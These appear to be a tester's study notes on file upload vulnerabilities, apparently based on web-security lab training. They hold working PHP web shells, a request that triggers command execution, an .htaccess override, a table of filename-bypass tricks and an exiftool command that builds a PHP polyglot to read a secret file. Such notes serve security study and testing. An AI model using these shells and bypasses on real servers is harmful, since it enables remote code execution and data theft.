# Resources
- Intigriti Hackademy videos on File Upload Vulnerabilities
# Payload lists
- [PayloadAllTheThings - Upload Insecure Files/Extension PHP/extensions.lstUpload Insecure Files/Extension PHP/extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
# What are they and their impact?
- When users can upload files to the server and they are not properly validated.
- Example of characteristics that should be validated:
    - Name
    - Type
    - Contents
    - Size
- Upload malicious files(XSS payload, etc)
- Re-write critical files in the web application
- These could be turned to RCE (Remote Code Execution) given the right circumstances
# How do they arise?
- Improper validation
- Parsing discrepancies
- Faulty blacklist implemented
- Trusting Client-side validation
## Uploading Code 
- Does the server allow the user to upload server-side scripts?
    - PHP
    - Java
    - Python
- Sample Web Shells
```php
<?php system($_GET['command']); ?>
```

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
- Sample Request
```http
GET /example/exploit.php?command=id HTTP/1.1
```
# Exploiting flawed validation of file uploads
- Sending text `Content-Type: application/x-www-form-url-encoded`
- Sending large amounts of data (E.g.: images) `Content-Type: multipart/form-data`
- These types of requests are divided into sections and they are similar to the request shown below
- The server might check that the Content-Type is the expected MIME type
- However, the header might be blindly trusted without checking if the data matches the MIME type 
```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
```
- Craft a request that has the malicious data in it and the expected MIME type, see if it is uploaded
- Craft a request that has the malicious data in it and malicious MIME type, see if it is uploaded
# Path traversal in file upload
- Some servers prevent scripts from running unless they are running from certain specific directories
- Modify the "filename" and attempt path traversal (obfuscation, encoding, and other path traversal techniques might be needed)
- Path traversal could also be used to upload files to unexpected locations and even re-write files
# Improper file type blacklisting
- Bypass using lesser known alternatives (.php5 instead of .php)
- Overriding server configuration files (Upload a configuration file `.htaccess` (Apache) | `web.config` (IIS server) mapping an arbitrary extension to an executable MIME type)
```
Addtype application/x-httpd-php .s33k
```
- Obfuscate the file extension: Example extension `.php`
| Scenario               | Example              |
|------------------------|----------------------|
|Case sensitive          | .pHp                 |
|Multiple extensions     | exploit.php.jpg      |
|Add trailing character  | .php <-- whitespace  |
|Add trailing character  | .php.<-- dot         |
|URL Encoding            | exploit%2Ephp        |
|URL Double Encoding     | exploit%252Ephp      |
|Semicolon               | exploit.php;.jpg     |
|URL Encoded Null byte   | exploit.php%00.jpg   |
|Non-recursive stripping | exploit.p.php.hp     |
# Polyglots
Use exiftool to create a polygot to try to bypass security controls
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" apple.png -o poly.php
```
